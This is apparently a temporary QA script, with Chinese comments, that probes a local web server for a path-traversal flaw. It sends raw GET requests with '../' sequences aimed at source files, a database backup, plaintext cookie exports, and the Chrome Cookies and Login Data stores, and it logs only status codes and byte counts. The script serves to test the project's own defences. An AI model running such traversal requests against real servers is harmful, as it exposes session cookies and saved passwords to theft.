"""安全专项只读探测 · 第三轮（利用链取证 + 健壮性对照，临时 QA 脚本）。

- 验证「路径穿越 → 项目内明文 Cookie 导出文件 / 数据库备份」可达性（只记录状态与字节数，
  不落盘、不打印任何 Cookie 值）。
- 验证对目录调用 read_bytes 时的行为（连接中断 = 无兜底异常处理）。
不发起任何写请求。结果写入 tools/_qa_security_probe3.out。
"""
from __future__ import annotations

import socket
from pathlib import Path

HOST, PORT = "127.0.0.1", 8765
OUT = Path(__file__).resolve().parent / "_qa_security_probe3.out"
lines: list[str] = []


def log(*a):
    lines.append(" ".join(str(x) for x in a))


def raw_get(target: str, max_body: int = 65536) -> dict:
    req = (f"GET {target} HTTP/1.1\r\nHost: 127.0.0.1:{PORT}\r\n"
           f"User-Agent: qa-sec-probe\r\nAccept: */*\r\nConnection: close\r\n\r\n")
    try:
        with socket.create_connection((HOST, PORT), timeout=8) as s:
            s.sendall(req.encode("latin-1", "replace"))
            buf = b""
            while len(buf) < max_body:
                c = s.recv(65536)
                if not c:
                    break
                buf += c
    except Exception as e:  # noqa: BLE001
        return {"target": target, "error": f"{type(e).__name__}: {e}"}
    head, _, body = buf.partition(b"\r\n\r\n")
    hdrs = head.decode("latin-1", "replace").split("\r\n")
    status = hdrs[0] if hdrs else "<no response>"
    cl = ""
    for h in hdrs[1:]:
        if h.lower().startswith("content-length:"):
            cl = h.split(":", 1)[1].strip()
    return {"target": target, "status": status, "cl": cl, "body": body}


log("=" * 78)
log("[F] 利用链可达性：穿越 → 项目内高价值文件（仅状态/字节数，不打印内容）")
log("=" * 78)
chain = [
    "/static/../server.py",                                  # 后端源码
    "/static/../db.py",
    "/static/../../main.py",                                 # 项目根
    "/static/../../app.db".replace("app.db", "viewer/app.db"),
    "/static/../../viewer/app.db.bak-20260922-230629",        # 数据库备份
    "/static/../../tools/_cookies_latest.json",               # 明文 Cookie 导出
    "/static/../../tools/_user_tgbuser_only.json",            # 账号 id
    "/static/../../tools/cookies.prev-anon.json",
    "/static/../../.browser-profile/Default/Network/Cookies",  # Chrome Cookie 库
    "/static/../../.browser-profile/Default/Login Data",       # Chrome 保存的密码库
    "/static/../../../../Windows/win.ini",                     # 跨盘符（预期 404）
]
for t in chain:
    r = raw_get(t)
    if r.get("error"):
        log(f"  {t:56s} -> {r['error']}")
        continue
    log(f"  {t:56s} -> {r['status']}  Content-Length={r['cl']}  bytes_read={len(r['body'])}")

log("")
log("=" * 78)
log("[G] 健壮性对照：目录 / 特殊路径（read_bytes 无兜底 → 连接中断）")
log("=" * 78)
for t in ("/static/..", "/static/.", "/static/../static", "/static/"):
    r = raw_get(t, max_body=4096)
    if r.get("error"):
        log(f"  {t:22s} -> {r['error']}（无任何响应体）")
    else:
        log(f"  {t:22s} -> {r['status']}  bytes_read={len(r['body'])}")

OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
print("written:", OUT)
